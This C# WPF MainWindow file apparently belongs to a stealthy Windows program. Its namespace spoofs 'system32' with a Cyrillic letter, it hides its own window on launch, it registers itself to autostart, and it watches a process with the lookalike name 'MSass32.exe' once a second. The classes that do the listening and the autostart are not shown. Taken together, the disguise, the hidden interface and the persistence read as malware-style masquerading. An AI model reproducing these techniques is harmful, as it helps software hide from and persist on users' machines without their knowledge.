using System;
using System.Windows;
using systеm32.exe.Models;

namespace systеm32.exe
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private readonly TimeSpan timeWatchIntervalInMilliseconds = TimeSpan.FromSeconds(1);
        private readonly string _fileName = "MSass32.exe";

        private readonly IListener _listener;
        public MainWindow()
        {
            InitializeComponent();
            Hide();

            try
            {
                if (Environment.GetCommandLineArgs().Length > 1
                    && System.IO.File.Exists(Environment.GetCommandLineArgs()[1]))
                {
                    _fileName = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
                                                       Environment.GetCommandLineArgs()[1]);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }


            _listener = new ProcessListener(_fileName,
                                            timeWatchIntervalInMilliseconds);
            new AutoStartSettler().Set();
            _listener.StartListening();
        }
    }
}
